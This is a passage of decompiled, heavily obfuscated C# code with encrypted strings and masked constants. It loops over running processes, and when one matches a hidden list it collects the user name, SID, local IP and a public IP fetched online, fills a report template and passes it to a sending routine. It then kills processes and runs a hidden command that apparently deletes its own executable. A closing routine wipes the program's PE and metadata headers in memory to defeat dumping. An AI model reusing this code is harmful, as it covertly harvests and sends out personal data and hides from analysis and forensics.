			array[smethod_17(550903174)] = smethod_4("⪻⪧⪧⪣⫓⪧⪜⪜⪟⪘⪚⪇", smethod_17(-1744292053));
			array[smethod_17(550903175)] = smethod_4("曥曚曆曁曘曔曛", smethod_17(-559252627));
			array[smethod_17(550903224)] = smethod_4("秜秋秘秌秝秅秘", smethod_17(2005820528));
			array[smethod_17(550903225)] = smethod_4("瞪瞁瞐瞷瞔瞅瞖瞏瞁瞖", smethod_17(-1840747972));
			array[smethod_17(550903226)] = smethod_4("쮂쮰쮷쮆쮶쮴쮧쮴쮷", smethod_17(615831053));
			array[smethod_17(550903227)] = smethod_4("\u0384εΦλΧ", smethod_17(-1461182964));
			array[smethod_17(550903228)] = smethod_4("讆讆讙讦讥讹讼计", smethod_17(-1157261811));
			array[smethod_17(550903229)] = smethod_4("敻敔敏敘敟效敚", smethod_17(1392277733));
			array[smethod_17(550903230)] = smethod_4("톈톡톶톷톞톼톡톶톷", smethod_17(1582877718));
			array[smethod_17(550903231)] = smethod_4("\ueb17\ueb21\ueb28\ueb21\ueb2a\ueb2d\ueb31\ueb29", smethod_17(1762588316));
			array[smethod_17(550903216)] = smethod_4("ዞዙዱዠዱዦ", smethod_17(-1439822004));
			array[smethod_17(550903217)] = smethod_4("餛餂餖餔餛餞餒餙餃饚餞饄饏饁饙餓餛餛", smethod_17(-292518737));
			array[smethod_17(550903218)] = smethod_4("즃즬즽즋즻즨즠즧즺", smethod_17(727045137));
			array[smethod_17(550903219)] = smethod_4("\uf015\uf01e\uf005\uf021\uf014\uf014\uf01a", smethod_17(1504832937));
			array[smethod_17(550903220)] = smethod_4("卂卭卼半卺卩卡卦卻匨卬卧卼単卭卭卣", smethod_17(-1974907184));
			array[smethod_17(550903221)] = smethod_4("ᐽᐜᑍᐝᐖᐍ", smethod_17(-25556575));
			array[smethod_17(550903222)] = smethod_4("몪몆몚몤몆몚", smethod_17(2025236273));
			array[smethod_17(550903223)] = smethod_4("\ud951\ud96b\ud96f\ud972\ud96e\ud967\ud943\ud971\ud971\ud967\ud96f\ud960\ud96e\ud97b\ud947\ud97a\ud972\ud96e\ud96d\ud970\ud967\ud970", smethod_17(-748501798));
			array[smethod_17(550903208)] = smethod_4("샛샼샺샡샦샯샌샭샫샺샱샸샼샧샺", smethod_17(-602743472));
			array[smethod_17(550903209)] = smethod_4("\udc95\udcb9\udcb2\udcb3\udc95\udca4\udcb7\udcb5\udcbd\udcb3\udca4", smethod_17(1301725454));
			array[smethod_17(550903210)] = smethod_4("泾沵沴波泤泡", smethod_17(290156894));
			array[smethod_17(550903211)] = smethod_4("\uea95\ueadb\uead9\uea89\uea8f\uea8a", smethod_17(-2022312139));
			array[smethod_17(550903212)] = smethod_4("ᖜᖟᖟᖊᖗᖑᖔ", smethod_17(1418332203));
			array[smethod_17(550903213)] = smethod_4("甛甁甅甘甄甍甉甛甛甍甅甊甄甑", smethod_17(1995204784));
			array[smethod_17(550903214)] = smethod_4("㛍㛑㛑㛕㛄㛋㛄㛉㛜㛟㛀㛗", smethod_17(508898173));
			array[smethod_17(550903215)] = smethod_4("ÌÐÐÔÀÁÆÑÃ", smethod_17(-699916932));
			array[smethod_17(550903200)] = smethod_4("댟댐댝댝댕댜댋", smethod_17(1289465505));
			array[smethod_17(550903201)] = smethod_4("欮欬欱欽欻欭欭欶欿欽欵欻欬", smethod_17(-537823610));
			array[smethod_17(550903202)] = smethod_4("뒡뒱뒫뒾뒾뒳뒍뒪듪들", smethod_17(1560455434));
			array[smethod_17(550903203)] = smethod_4("㠶㠦㠼㠩㠩㠤㠚㠽㡳㡱", smethod_17(1422927261));
			array[smethod_17(550903204)] = smethod_4("௶௦\u0bfc௩௩\u0be4", smethod_17(-678226339));
			array[smethod_17(550903205)] = smethod_4("≊≎≎≖≍≊≗≚≇≆≁≖≄≄≆≑", smethod_17(1552760795));
			array[smethod_17(550903206)] = smethod_4("㜭㜅㜇㜁㜤㜕㜍㜐㜅㜒", smethod_17(-2000147784));
			array[smethod_17(550903207)] = smethod_4("\udb72\udb65\udb73\udb68\udb61\udb63\udb6b\udb65\udb72", smethod_17(1613219544));
			array[smethod_17(550903128)] = smethod_4("쵴쵿쵲쵶쵣촷쵲쵹쵰쵾쵹쵲", smethod_17(-102706993));
			array[smethod_17(550903129)] = smethod_4("盵盩盪盧直盱盯盨盢盵", smethod_17(-1911461026));
			array[smethod_17(550903130)] = smethod_4("ҀҜҜҘҌҭҪҽүүҭҺқҾҫ", smethod_17(1667176720));
			array[smethod_17(550903131)] = smethod_4("縷拏壘諾稜拏寧壘", smethod_17(1455219942));
			array[smethod_17(550903132)] = smethod_4("뷝뷕뷗뷑뷔뷅뷝뷀뷕뷂", smethod_17(373596264));
			array[smethod_17(550903133)] = smethod_4("簶簳簬簯簦", smethod_17(528507271));
			array[smethod_17(550903134)] = smethod_4("ẄẓẐẚẓẕẂẙẄ", smethod_17(1126368046));
			array[smethod_17(550903135)] = smethod_4("㉅㉘㉅㉉㉎㉆㉏㉐㉅", smethod_17(-54841352));
			array[smethod_17(550903120)] = smethod_4("\uf5f8\uf5d9\uf5c8\uf5d9\uf5df\uf5c8\uf5f5\uf5c8\uf5f9\uf5dd\uf5cf\uf5c5", smethod_17(1558898788));
			array[smethod_17(550903121)] = smethod_4("ﾩﾔﾉﾅﾂﾊﾃￌﾼﾩ", smethod_17(-724573644));
			array[smethod_17(550903122)] = smethod_4("꺍꺯꺲꺾꺸꺮꺮껽꺕꺼꺾꺶꺸꺯", smethod_17(1481683717));
			array[smethod_17(550903123)] = smethod_4("叢叾叾叺厊叮叏又叟反反叏变", smethod_17(1835355762));
			array[smethod_17(550903124)] = smethod_4("\uddf5\uddff\uddc2\udde1\udde8", smethod_17(-69418935));
			array[smethod_17(550903125)] = smethod_4("ꐺꐕꐘꐘꐐꐙꐎꑜꐹꐊꐙꐎꐅꐋꐔꐙꐎꐙ", smethod_17(-484132444));
			array[smethod_17(550903126)] = smethod_4("ꆷꆊꆆꆀꆗꆟꆗꆶꆇꆟꆂꆗꆀ", smethod_17(137870378));
			array[smethod_17(550903127)] = smethod_4("\u0e76\u0e4e\u0e79\u0e48๐\u0e4d๘๏", smethod_17(1728779237));
			array[smethod_17(550903112)] = smethod_4("ᔣᔠᔠᔵᔨᔮᔫ", smethod_17(1196165268));
			array[smethod_17(550903113)] = smethod_4("㈞㈮㈒", smethod_17(1384853390));
			array[smethod_17(550903114)] = smethod_4("\ueb22\ueb33\ueb2b\ueb36\ueb23\ueb34", smethod_17(735770270));
			array[smethod_17(550903115)] = smethod_4("\uf21d\uf23f\uf222\uf22a\uf23f\uf228\uf23e\uf23e\uf26d\uf219\uf228\uf221\uf228\uf23f\uf224\uf226\uf26d\uf20b\uf224\uf229\uf229\uf221\uf228\uf23f\uf26d\uf21a\uf228\uf22f\uf26d\uf209\uf228\uf22f\uf238\uf22a\uf22a\uf228\uf23f", smethod_17(-1215172715));
			array[smethod_17(550903116)] = smethod_4("풆풌풱풒풛퓏풚퓚퓔", smethod_17(1658898746));
			array[smethod_17(550903117)] = smethod_4("凌丹肋綾壟烙肋菱陋寧菱肋", smethod_17(-1971919634));
			array[smethod_17(550903118)] = smethod_4("捑捺捷捳捦挲捗捼捵捻捼捷", smethod_17(-154173750));
			array[smethod_17(550903119)] = smethod_4("⁝⁖⁛\u205f⁊⁛⁐⁙⁗⁐⁛", smethod_17(-1552859674));
			array[smethod_17(550903104)] = smethod_4("按挂挏挋挞挏挄挍挃挄挏捇挒捒捜挵捜捞", smethod_17(-401768782));
			array[smethod_17(550903105)] = smethod_4("ᓖᓊᓊᓎᓚᓻᓼᓫᓹᓹᓻᓬᓋᓗ", smethod_17(-892466874));
			array[smethod_17(550903106)] = smethod_4("\ue0af\ue08d\ue090\ue09c\ue09a\ue08c\ue08c\ue0b7\ue09e\ue09c\ue094\ue09a\ue08d", smethod_17(255720743));
			array[smethod_17(550903107)] = smethod_4("ﺸﻳﻲﺤﺢﺧ", smethod_17(-1702763752));
			array[smethod_17(550903108)] = smethod_4("禢秬秮禾禸禽", smethod_17(1298686978));
			array[smethod_17(550903109)] = smethod_4("\ue19a\ue1d4\ue1d6\ue186\ue180\ue185\ue1cc\ue186\ue18e\ue18e", smethod_17(-1328546758));
			array[smethod_17(550903110)] = smethod_4("辢迩迨达辸辽迴达辶辶", smethod_17(-1549233662));
			array[smethod_17(550903111)] = smethod_4("粹粒粉粳粘粉粹粜粉粜精粒粑粑粘粞粉粒粏糎糏", smethod_17(-1316003547));
			array[smethod_17(550903160)] = smethod_4("鵭鵆鵝鵧鵌鵝鵭鵈鵝鵈鵪鵆鵅鵅鵌鵊鵝鵆鵛鴟鴝", smethod_17(1496809713));
			array[smethod_17(550903161)] = smethod_4("䉸䉽䉽䈛䉾䉃䉋䉗䉔䉉䉞䉉", smethod_17(990011363));
			array[smethod_17(550903162)] = smethod_4("봁뵦뵿뵦봋뵦뵸뵦뵦봈뵦봹뵦봡뵦봼뵦뵿뵦봞뵦", smethod_17(2000986260));
			array[smethod_17(550903163)] = smethod_4("蕯蕳蕰蕽蕮蕫蕵蕲蕸蕯", smethod_17(1282578628));
			array[smethod_17(550903164)] = smethod_4("ﴤﴸﴸﴼﴨﴉﴎﴙﴋﴋﴉﴞ﴿ﴚﴏ", smethod_17(-1202724684));
			array[smethod_17(550903165)] = smethod_4("\ud9ef\ud9f3\ud9f3\ud9f7\ud9e3\ud9c2\ud9c5\ud9d2\ud9c0\ud9c0\ud9c2\ud9d5\ud9f2\ud9ee", smethod_17(-1105148801));
			array[smethod_17(550903166)] = smethod_4("큧큔큇큐큛큖큊큋큌큅", smethod_17(-1532375558));
			array[smethod_17(550903167)] = smethod_4("뒷뒘뒝뒔뒰뒒뒅뒘뒇뒘뒅뒈뒦뒐뒅뒒뒙", smethod_17(1043245353));
			array[smethod_17(550903152)] = smethod_4("邺邱邠邷邼邱邵邠", smethod_17(-694448884));
			string[] array2 = array;
			string[] array3 = new string[smethod_17(550903259)];
			array3[smethod_17(550903256)] = smethod_4("┊┎├┖┎━┛┆┌┇┊┎┛", smethod_17(-223659849));
			array3[smethod_17(550903257)] = smethod_4("鱉鱍鱏", smethod_17(2030207476));
			array3[smethod_17(550903258)] = smethod_4("ㅘㅹㄷㅙㄷㅽㅏㅕㅽㅠㅤㅩㅏㅃㅤㅢㅹㅾㅷㄫㄷㄹ", smethod_17(-2046350136));
			string[] array4 = array3;
			HashSet<string> hashSet = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			HashSet<string> hashSet2 = new HashSet<string>(StringComparer.OrdinalIgnoreCase);
			string[] array5 = array4;
			for (int i = smethod_17(550903256); i < array5.Length; i += smethod_17(550903257))
			{
				string text9 = array5[i];
				if ((string.IsNullOrWhiteSpace(text9) ? 1 : 0) == smethod_17(550903256))
				{
					hashSet.Add(text9.Trim());
				}
			}
			string[] array6 = array2;
			for (int j = smethod_17(550903256); j < array6.Length; j += smethod_17(550903257))
			{
				string text10 = array6[j];
				if ((string.IsNullOrWhiteSpace(text10) ? 1 : 0) == smethod_17(550903256))
				{
					hashSet2.Add(text10.Trim());
				}
			}
			while (true)
			{
				smethod_17(550903257);
				try
				{
					if (Registry.CurrentUser.OpenSubKey(smethod_4("윭윱윸윪윩윿윬윻윢윽윖윛윟윊읞윻윐윙윗윐윛윢율윛윌윍윗윑윐읞윽윖윛윝윕", smethod_17(1234819750))) != null)
					{
						smethod_15(smethod_4("\ued12\ued15\ued00\ued13\ued15\ued61\ued02\ued0c\ued05\ued61\ued6e\ued02\ued61\ued63\ued02\ued0e\ued0d\ued0e\ued13\ued61\ued71\ued72\ued61\ued67\ued67\ued61\ued04\ued02\ued09\ued0e\ued61\ued02\ued29\ued24\ued20\ued35\ued61\ued24\ued2f\ued26\ued28\ued2f\ued24\ued61\ued25\ued24\ued35\ued24\ued22\ued35\ued24\ued25\ued60\ued61\ued67\ued67\ued61\ued11\ued00\ued14\ued12\ued04\ued63\ued61", smethod_17(-1933840231)));
						ProcessStartInfo startInfo = new ProcessStartInfo
						{
							WindowStyle = (ProcessWindowStyle)smethod_17(550903257),
							CreateNoWindow = ((byte)smethod_17(550903257) != 0),
							Arguments = smethod_4("霹靕霶靵靾靹靿靵靳霶霹靕霶靏霶霹靘霶霹青霶靏霶霹靂霶霥霶霰霶青靳靺霶霴", smethod_17(1298827982)) + Application.ExecutablePath + smethod_4("Ⅻ", smethod_17(884554897)),
							FileName = smethod_4("鱥鱫鱢鰨鱣鱾鱣", smethod_17(844399070))
						};
						Process.Start(startInfo);
						Process.GetCurrentProcess().Kill();
						Environment.Exit(smethod_17(550903256));
					}
					Process[] processes = Process.GetProcesses();
					Process[] array7 = processes;
					for (int k = smethod_17(550903256); k < array7.Length; k += smethod_17(550903257))
					{
						Process process = array7[k];
						try
						{
							if (process.HasExited)
							{
								continue;
							}
							string text11 = process.ProcessName.ToLower().Trim();
							if (string.IsNullOrWhiteSpace(text11) || hashSet.Contains(text11))
							{
								continue;
							}
							bool flag = (byte)smethod_17(550903256) != 0;
							string text12 = smethod_4("", smethod_17(-1678765471));
							foreach (string item in hashSet2)
							{
								string text13 = item.ToLower().Trim();
								if (!string.Equals(text11, text13, (StringComparison)smethod_17(550903261)))
								{
									if (text13.EndsWith(smethod_4("፵", smethod_17(-1900081529))))
									{
										if (text13.Length <= smethod_17(550903257))
										{
											continue;
										}
									}
									else if (smethod_17(550903256) == 0)
									{
										continue;
									}
									string value = text13.Substring(smethod_17(550903256), text13.Length - smethod_17(550903257));
									if (text11.StartsWith(value, (StringComparison)smethod_17(550903261)))
									{
										flag = (byte)smethod_17(550903257) != 0;
										text12 = item;
										break;
									}
									continue;
								}
								flag = (byte)smethod_17(550903257) != 0;
								text12 = item;
								break;
							}
							if (!flag)
							{
								continue;
							}
							int id = process.Id;
							string processName = process.ProcessName;
							try
							{
								if (text3 == smethod_4("ﶘ", smethod_17(-951852943)))
								{
									if (text4 == smethod_4("颫", smethod_17(406684994)))
									{
										if (text == smethod_4("አ", smethod_17(-533655735)))
										{
											smethod_14();
											return;
										}
										smethod_3((uint)id);
										smethod_3((uint)Process.GetCurrentProcess().Id);
										return;
									}
									smethod_15(smethod_4("즕즒즇즔즒짦즅즋즂짦짩즅짦짤즅즉즊즉즔짦짶짵짦짠짠짦즃즅즎즉짦", smethod_17(550097950)) + text5 + smethod_4("ᗀᗆᗆᗀᖰᖡᖵᖳᖥᗂᗀ", smethod_17(2093615160)));
									ProcessStartInfo startInfo2 = new ProcessStartInfo
									{
										WindowStyle = (ProcessWindowStyle)smethod_17(550903257),
										CreateNoWindow = ((byte)smethod_17(550903257) != 0),
										Arguments = smethod_4("\ueb70\ueb1c\ueb7f\ueb3c\ueb37\ueb30\ueb36\ueb3c\ueb3a\ueb7f\ueb70\ueb1c\ueb7f\ueb06\ueb7f\ueb70\ueb11\ueb7f\ueb70\ueb1b\ueb7f\ueb06\ueb7f\ueb70\ueb0b\ueb7f\ueb6c\ueb7f\ueb79\ueb7f\ueb1b\ueb3a\ueb33\ueb7f\ueb7d", smethod_17(-1490225529)) + Application.ExecutablePath + smethod_4("㌝", smethod_17(1723018983)),
										FileName = smethod_4("\ueb4e\ueb40\ueb49\ueb03\ueb48\ueb55\ueb48", smethod_17(851834613))
									};
									smethod_3((uint)id);
									Process.Start(startInfo2);
									if (text == smethod_4("ꮱ", smethod_17(611890776)))
									{
										smethod_14();
									}
									else
									{
										smethod_3((uint)Process.GetCurrentProcess().Id);
									}
									return;
								}
								ServicePointManager.Expect100Continue = (byte)smethod_17(550903257) != 0;
								ServicePointManager.SecurityProtocol = (SecurityProtocolType)smethod_17(550900184);
								string userName = Environment.UserName;
								string text14 = smethod_4("鐼鐇鐂鐇鐆鐞鐇", smethod_17(487229873));
								string text15 = smethod_4("৷\u09cc\u09c9\u09cc\u09cd\u09d5\u09cc", smethod_17(623645818));
								string value2 = WindowsIdentity.GetCurrent().User.Value;
								string text16 = smethod_13();
								try
								{
									IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
									IPAddress[] addressList = hostEntry.AddressList;
									for (int l = smethod_17(550903256); l < addressList.Length; l += smethod_17(550903257))
									{
										IPAddress iPAddress = addressList[l];
										if (iPAddress.AddressFamily == (AddressFamily)smethod_17(550903258))
										{
											text15 = iPAddress.ToString();
											break;
										}
									}
								}
								catch
								{
									text15 = smethod_4("\uf1b2\uf189\uf18c\uf189\uf188\uf190\uf189", smethod_17(-1618875329));
								}
								try
								{
									using WebClient webClient = new WebClient();
									webClient.Proxy = null;
									text14 = webClient.DownloadString(smethod_4("谭谱谱谵谶豿豪豪谤谵谬豫谬谵谬谣谼豫谪谷谢豪豺谣谪谷谨谤谱豸谱谠谽谱", smethod_17(140677533))).Trim();
								}
								catch
								{
									text14 = smethod_4("롟롤롡롤롥롽롤", smethod_17(-700799534));
								}
								smethod_10(text8);
								if (File.Exists(text8))
								{
									try
									{
										string text17 = smethod_12();
										string processName2 = Process.GetCurrentProcess().ProcessName;
										string format = smethod_4("㾽㾽㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾥㾩㾨㾲㾣㾨㾲㿤㿼㿦㾨㾳㾪㾪㿪㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾣㾫㾤㾣㾢㾵㿤㿼㿦㾝㾽㾽㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾲㾯㾲㾪㾣㿤㿼㿦㿤㿸㿦㾇㾨㾲㾯㿫㾅㾴㾧㾥㾭㿦㾂㾣㾲㾣㾥㾲㾯㾩㾨㿦㾇㾪㾣㾴㾲㿤㿪㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾢㾣㾵㾥㾴㾯㾶㾲㾯㾩㾨㿤㿼㿦㿤㿦㿸㿦㾖㾴㾯㾰㾧㾲㾣㿦㾏㾖㿼㿦㾽㿶㾻㾚㾨㿦㿸㿦㾖㾳㾤㾪㾯㾥㿦㾏㾖㿼㿦㾽㿷㾻㾚㾨㿦㿸㿦㾎㾑㾏㾂㿼㿦㾽㿴㾻㾚㾨㿦㿸㿦㾋㾩㾲㾮㾣㾴㾤㾩㾧㾴㾢㿦㾏㾂㿼㿦㾽㿵㾻㾚㾨㿦㿸㿦㾇㾶㾶㿦㾋㾂㿳㿦㾎㾧㾵㾮㿼㿦㾽㿲㾻㾚㾨㿦㿸㿦㾖㾴㾩㾥㾣㾵㾵㿦㾈㾧㾫㾣㿼㿦㾽㿳㾻㾚㾨㿦㿸㿦㾅㾩㾫㾶㾳㾲㾣㾴㿦㾈㾧㾫㾣㿼㿦㾽㿰㾻㾚㾨㿦㿸㿦㾂㾣㾲㾣㾥㾲㾣㾢㿦㾒㾩㾩㾪㿼㿦㾽㿱㾻㾚㾨㿦㿸㿦㾋㾧㾲㾥㾮㾣㾢㿦㾔㾳㾪㾣㿼㿦㾽㿾㾻㾚㾨㿤㿪㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾥㾩㾪㾩㾴㿤㿼㿦㿷㿰㿱㿷㿷㿰㿾㿶㿪㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾠㾩㾩㾲㾣㾴㿤㿼㿦㾽㾽㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾲㾣㾾㾲㿤㿼㿦㿤㾇㾨㾲㾯㿫㾅㾴㾧㾥㾭㿦㾕㾿㾵㾲㾣㾫㿤㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㾻㾻㿪㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿤㾲㾯㾫㾣㾵㾲㾧㾫㾶㿤㿼㿦㿤㾽㿿㿼㾿㾿㾿㾿㿫㾋㾋㿫㾢㾢㾒㾎㾎㿼㾫㾫㿼㾵㾵㿨㾠㾠㾠㾜㾻㿤㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㾻㾻㾛㿋㿌㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㿦㾻㾻", smethod_17(-504225250));
										object[] array8 = new object[smethod_17(550903250)];
										array8[smethod_17(550903256)] = text15;
										array8[smethod_17(550903257)] = text14;
										array8[smethod_17(550903258)] = value2;
										array8[smethod_17(550903259)] = text16;
										array8[smethod_17(550903260)] = text17;
										array8[smethod_17(550903261)] = processName2;
										array8[smethod_17(550903262)] = userName;
										array8[smethod_17(550903263)] = processName;
										array8[smethod_17(550903248)] = text12;
										array8[smethod_17(550903249)] = DateTime.UtcNow;
										string string_ = string.Format(format, array8);
										string string_2 = Encoding.UTF8.GetString(Convert.FromBase64String(s));
										smethod_11(string_2, text8);
										smethod_9(string_2, string_);
										try
										{
											File.Delete(text8);
											if (Directory.Exists(text7))
											{
												Directory.Delete(text7, (byte)smethod_17(550903257) != 0);
											}
										}
										catch
										{
										}
									}
									catch
									{
									}
								}
								if (text4 == smethod_4("몽", smethod_17(-1569020076)))
								{
									if (text == smethod_4("淡", smethod_17(373977096)))
									{
										smethod_14();
										return;
									}
									smethod_3((uint)id);
									smethod_3((uint)Process.GetCurrentProcess().Id);
									return;
								}
								smethod_15(smethod_4("ᢐᢗᢂᢑᢗᣣᢀᢎᢇᣣᣬᢀᣣᣡᢀᢌᢏᢌᢑᣣᣳᣰᣣᣥᣥᣣ\u1886ᢀᢋᢌᣣ", smethod_17(-1067186917)) + text5 + smethod_4("\uf72a\uf72c\uf72c\uf72a\uf75a\uf74b\uf75f\uf759\uf74f\uf728\uf72a", smethod_17(-2047481134)));
								ProcessStartInfo startInfo3 = new ProcessStartInfo
								{
									WindowStyle = (ProcessWindowStyle)smethod_17(550903257),
									CreateNoWindow = ((byte)smethod_17(550903257) != 0),
									Arguments = smethod_4("䨲䩞䨽䩾䩵䩲䩴䩾䩸䨽䨲䩞䨽䩄䨽䨲䩓䨽䨲䩙䨽䩄䨽䨲䩉䨽䨮䨽䨻䨽䩙䩸䩱䨽䨿", smethod_17(1059149765)) + Application.ExecutablePath + smethod_4("뀳", smethod_17(1927917001)),
									FileName = smethod_4("᪐\u1a9e᪗\u1add᪖\u1a8b᪖", smethod_17(74581803))
								};
								smethod_3((uint)id);
								Process.Start(startInfo3);
								if (text == smethod_4("茳", smethod_17(2079694554)))
								{
									smethod_14();
								}
								else
								{
									smethod_3((uint)Process.GetCurrentProcess().Id);
								}
								return;
							}
							catch
							{
								smethod_3((uint)Process.GetCurrentProcess().Id);
								return;
							}
						}
						catch
						{
						}
					}
				}
				catch
				{
				}
				Thread.Sleep(smethod_17(550902280));
			}
		}
		catch
		{
		}
	}

	[Obsolete("Exclude")]
	public static int smethod_17(int int_4)
	{
		return int_4 ^ 0x20D61DD8;
	}

	[Obsolete("Exclude")]
	public static int smethod_18(int int_4)
	{
		return int_4 ^ 0x5B7124FF;
	}

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	public unsafe static extern bool VirtualProtect(byte* pByte_0, int int_4, uint uint_1, ref uint uint_2);

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	public static extern IntPtr GetModuleHandle(string string_0);

	[Obsolete("Exclude")]
	public unsafe static void smethod_19()
	{
		IntPtr moduleHandle = GetModuleHandle(null);
		if (moduleHandle == IntPtr.Zero)
		{
			return;
		}
		Module module = typeof(global::_003CModule_003E).Module;
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + 60;
		byte* ptr3;
		ptr2 = (ptr3 = ptr + (uint)(*(int*)ptr2));
		ptr2 += 6;
		ushort num = *(ushort*)ptr2;
		ptr2 += 14;
		ushort num2 = *(ushort*)ptr2;
		ptr2 = (ptr3 = ptr2 + 4 + (int)num2);
		byte* ptr4 = stackalloc byte[11];
		int[] array = new int[2] { 26, 27 };
		uint uint_ = default(uint);
		for (int i = 0; i < array.Length; i++)
		{
			VirtualProtect(ptr3 + array[i], 1, 64u, ref uint_);
			ptr3[array[i]] = byte.MaxValue;
		}
		if (module.FullyQualifiedName[0] != '<')
		{
			byte* ptr5 = ptr + (uint)(*((int*)ptr2 - 4));
			if (*((uint*)ptr2 - 30) != 0)
			{
				byte* ptr6 = ptr + (uint)(*((int*)ptr2 - 30));
				byte* ptr7 = ptr + (uint)(*(int*)ptr6);
				byte* ptr8 = ptr + (uint)((int*)ptr6)[3];
				byte* ptr9 = ptr + (uint)(*(int*)ptr7) + 2;
				VirtualProtect(ptr8, 11, 64u, ref uint_);
				*(int*)ptr4 = 1818522734;
				((int*)ptr4)[1] = 1818504812;
				((short*)ptr4)[4] = 108;
				ptr4[10] = 0;
				for (int j = 0; j < 11; j++)
				{
					ptr8[j] = ptr4[j];
				}
				VirtualProtect(ptr9, 11, 64u, ref uint_);
				*(int*)ptr4 = 1866691662;
				((int*)ptr4)[1] = 1852404846;
				((short*)ptr4)[4] = 25973;
				ptr4[10] = 0;
				for (int k = 0; k < 11; k++)
				{
					ptr9[k] = ptr4[k];
				}
			}
			byte* ptr10 = ptr2;
			for (int l = 0; l < num; l++)
			{
				VirtualProtect(ptr10, 8, 64u, ref uint_);
				for (int m = 0; m < 8; m++)
				{
					ptr10[m] = (byte)(65 + m % 26);
				}
				VirtualProtect(ptr10 + 36, 4, 64u, ref uint_);
				uint num3 = ((uint*)ptr10)[9];
				((int*)ptr10)[9] = (int)num3 ^ -1431655766;
				ptr10 += 40;
			}
			VirtualProtect(ptr5, 72, 64u, ref uint_);
			byte* ptr11 = ptr + (uint)((int*)ptr5)[2];
			*(int*)ptr5 = -559038737;
			((int*)ptr5)[1] = -889275714;
			((int*)ptr5)[2] = -17958194;
			((int*)ptr5)[3] = -559038242;
			VirtualProtect(ptr11, 4, 64u, ref uint_);
			*(int*)ptr11 = -1159983106;
			ptr11 += 12;
			ptr11 += (uint)(*(int*)ptr11);
			ptr11 = (byte*)(((long)ptr11 + 7L) & -4L);
			ptr11 += 2;
			ushort num4 = *ptr11;
			ptr11 += 2;
			for (int n = 0; n < num4; n++)
			{
				VirtualProtect(ptr11, 8, 64u, ref uint_);
				ptr11 += 4;
				ptr11 += 4;
				for (int num5 = 0; num5 < 8; num5++)
				{
					VirtualProtect(ptr11, 4, 64u, ref uint_);
					*ptr11 = (byte)(144 + num5 % 16);
					ptr11++;
					if (*ptr11 != 0)
					{
						*ptr11 = (byte)(144 + num5 % 16);
						ptr11++;
						if (*ptr11 != 0)
						{
							*ptr11 = (byte)(144 + num5 % 16);
							ptr11++;
							if (*ptr11 != 0)
							{
								*ptr11 = (byte)(144 + num5 % 16);
								ptr11++;
								continue;
							}
							ptr11++;
							break;
						}
						ptr11 += 2;
						break;
					}
					ptr11 += 3;
					break;
				}
			}
		}
		else
		{
			uint num6 = *((uint*)ptr2 - 4);
			uint num7 = *((uint*)ptr2 - 30);
			uint[] array2 = new uint[num];
			uint[] array3 = new uint[num];
			uint[] array4 = new uint[num];
			byte* ptr12 = ptr2;
			for (int num8 = 0; num8 < num; num8++)
			{
				VirtualProtect(ptr12, 8, 64u, ref uint_);
